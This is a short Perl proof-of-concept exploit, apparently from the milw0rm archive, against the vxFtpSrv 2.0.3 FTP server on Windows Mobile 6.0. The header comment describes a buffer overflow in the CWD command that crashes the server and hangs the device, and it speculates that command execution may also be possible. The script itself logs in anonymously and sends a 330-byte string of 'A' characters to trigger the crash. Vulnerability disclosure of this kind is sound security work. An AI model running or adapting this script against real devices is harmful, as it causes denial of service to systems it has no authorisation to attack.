#!/usr/bin/perl
########################################################
#
#  vxFtpSrv 2.0.3 CWD command Overflow PoC
#  by Julien Bedard (www.kosseclab.com)
#  info@kosseclab.com
#
#  Tested on MS Windows Mobile 6.0
#  (maybe other versions are vulnerable)
#
# vxftpsrv is the most common ftp
# server for mobile devices: wm, ppc etc.
# it suffer of an overflow when it recieve too long
# data string by the CWD command.
#
# the result will be immediately close server and
# the windows mobile device will really hang-up.
# so it's required to reset the device to be completely
# operational.
#
# Maybe we can exploit this issue for doing command
# execution but i've not test it since i have nothing
# to debug the application in real time.
#
# If you can help for further analysis please email me
# at info@kosseclab.com
#
########################################################

use Net::FTP;
$wftpsrvaddr = "255.255.255.255";
$overflow = "A" x 330;
$user = "anonymous";
$pass = "test@something.com";
$port = 21;

$ftp = Net::FTP->new("$wftpsrvaddr", Debug => 0) || die "Cannot connect to ftp server: $@";
$ftp->login($user,$pass) || die "Cannot login ", $ftp->message;

$ftp->cwd($overflow);
$ftp->quit;

# milw0rm.com [2008-10-02]